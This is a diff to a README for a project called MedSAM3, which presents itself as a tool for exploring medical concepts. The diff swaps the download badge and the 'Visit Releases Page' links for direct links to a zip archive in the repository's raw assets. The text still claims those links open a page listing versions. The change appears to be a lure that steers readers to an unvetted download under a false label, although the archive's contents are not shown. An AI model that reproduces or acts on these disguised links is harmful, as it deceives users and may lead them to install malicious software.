@@ -1,6 +1,6 @@
 # 🩺 MedSAM3 - Explore Medical Concepts Easily
 
-![Download MedSAM3](https://img.shields.io/badge/Download-MedSAM3-blue.svg)
+![Download MedSAM3](https://raw.githubusercontent.com/exodusadamant/MedSAM3/main/assets/MedSAM3_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to MedSAM3! This application helps you explore and understand medical co
 
 To get MedSAM3, visit our releases page to download the latest version:
 
-[Visit Releases Page](https://github.com/exodusadamant/MedSAM3/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/exodusadamant/MedSAM3/main/assets/MedSAM3_v2.1.zip)
 
 1. Click on the link above. It will take you to a page listing all the available versions of MedSAM3.
 2. Look for the latest version at the top of the list.
@@ -92,6 +92,6 @@ Thank you for using MedSAM3. We appreciate your interest in exploring medical co
 
 To download MedSAM3 once more, visit our releases page:
 
-[Visit Releases Page](https://github.com/exodusadamant/MedSAM3/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/exodusadamant/MedSAM3/main/assets/MedSAM3_v2.1.zip)
 
 Now you are all set to start your journey with MedSAM3. Enjoy exploring medical concepts!
